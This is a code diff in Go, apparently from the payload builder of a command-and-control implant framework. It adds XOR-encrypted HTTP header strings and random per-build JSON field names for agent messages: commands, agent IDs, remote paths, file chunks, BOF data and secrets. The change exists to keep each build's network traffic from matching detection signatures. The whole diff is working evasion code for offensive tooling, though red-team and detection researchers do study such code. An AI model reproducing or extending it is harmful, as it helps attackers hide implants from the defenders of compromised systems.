@@ -1325,6 +1325,12 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *Payloa
 		}
 	}
 
+	// Generate random JSON field names for this build
+	jsonFields, err := GenerateJSONFieldNames()
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate JSON field names: %v", err)
+	}
+
 	// Values that should be encrypted
 	encryptedValues := map[string]string{
 		"PUBLIC_KEY":            data.keyPair.PublicKeyPEM,
@@ -1351,16 +1357,29 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *Payloa
 		"POST_DATA_TRANSFORMS":     postDataTransforms,
 		"RESPONSE_DATA_TRANSFORMS": responseDataTransforms,
 		// HTTP protocol strings (pre-connection, must be XOR encrypted)
-		"GE_METHOD_GET":       "GET",
-		"GE_METHOD_POST":      "POST",
-		"GE_PROTO_HTTPS":      "https",
-		"GE_PROTO_HTTP":       "http",
-		"GE_PORT_443":         "443",
-		"GE_PORT_80":          "80",
-		"GE_FMT_URL_NO_PORT":  "%s://%s",
+		"GE_METHOD_GET":        "GET",
+		"GE_METHOD_POST":       "POST",
+		"GE_PROTO_HTTPS":       "https",
+		"GE_PROTO_HTTP":        "http",
+		"GE_PORT_443":          "443",
+		"GE_PORT_80":           "80",
+		"GE_FMT_URL_NO_PORT":   "%s://%s",
 		"GE_FMT_URL_WITH_PORT": "%s://%s:%s",
-		"GE_FMT_URL_QUERY":    "%s%s?%s=%s",
-		"GE_SLASH":            "/",
+		"GE_FMT_URL_QUERY":     "%s%s?%s=%s",
+		"GE_SLASH":             "/",
+		// HTTP header name strings (pre-connection, must be XOR encrypted)
+		"HTTP_HEADER_USER_AGENT":   "User-Agent",
+		"HTTP_HEADER_CONTENT_TYPE": "Content-Type",
+		"HTTP_HEADER_PAD_PRE":      "X-Pad-Pre",
+		"HTTP_HEADER_PAD_APP":      "X-Pad-App",
+		"HTTP_META_ID":             "id",
+		"HTTP_META_ENCRYPTION":     "encryption",
+		"HTTP_ENC_RSA_AES":         "rsa+aes",
+	}
+
+	// Add JSON field names to encrypted values
+	for fieldName, fieldValue := range jsonFields {
+		encryptedValues[fieldName] = fieldValue
 	}
 
 	// Encrypt all values
@@ -1844,6 +1863,75 @@ func GenerateRandomString(length int) (string, error) {
 		result[i] = charset[randomInt.Int64()]
 	}
 	return string(result), nil
+}
+
+// GenerateRandomFieldName generates a random lowercase field name between 2-8 chars
+func GenerateRandomFieldName() (string, error) {
+	const charset = "abcdefghijklmnopqrstuvwxyz"
+	// Generate random length between 2 and 8
+	lengthBig, err := rand.Int(rand.Reader, big.NewInt(7)) // 0-6
+	if err != nil {
+		return "", err
+	}
+	length := int(lengthBig.Int64()) + 2 // 2-8
+
+	result := make([]byte, length)
+	for i := range result {
+		randomInt, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
+		if err != nil {
+			return "", err
+		}
+		result[i] = charset[randomInt.Int64()]
+	}
+	return string(result), nil
+}
+
+// GenerateJSONFieldNames generates random field names for all JSON fields
+// Returns a map of field name identifier to randomly generated value
+func GenerateJSONFieldNames() (map[string]string, error) {
+	fieldNames := []string{
+		"JF_CT",  // CommandType
+		"JF_CO",  // Command
+		"JF_CI",  // CommandID
+		"JF_CB",  // CommandDBID
+		"JF_AI",  // AgentID
+		"JF_FN",  // Filename
+		"JF_OF",  // OriginalFilename
+		"JF_RP",  // RemotePath
+		"JF_CC",  // CurrentChunk
+		"JF_TC",  // TotalChunks
+		"JF_DA",  // Data
+		"JF_AR",  // Arguments
+		"JF_TS",  // Timestamp
+		"JF_JI",  // JobID
+		"JF_OU",  // Output
+		"JF_EC",  // ExitCode
+		"JF_ER",  // Error
+		"JF_V",   // Version
+		"JF_T",   // Type
+		"JF_TPL", // Templates
+		"JF_P",   // Params
+		"JF_BD",  // BOFData
+		"JF_CD",  // ChunkData
+		"JF_ST",  // Status
+		"JF_NC",  // NewClientID
+		"JF_SI",  // SecretsInitialized
+		"JF_SG",  // Signature
+		"JF_SD",  // Seed
+		"JF_CT2", // CommsTemplate
+		"JF_ET",  // ExecReqTemplate
+		"JF_MD",  // Metadata
+	}
+
+	result := make(map[string]string)
+	for _, name := range fieldNames {
+		value, err := GenerateRandomFieldName()
+		if err != nil {
+			return nil, fmt.Errorf("failed to generate field name for %s: %v", name, err)
+		}
+		result[name] = value
+	}
+	return result, nil
 }
 
 // Improved sendBinaryFile
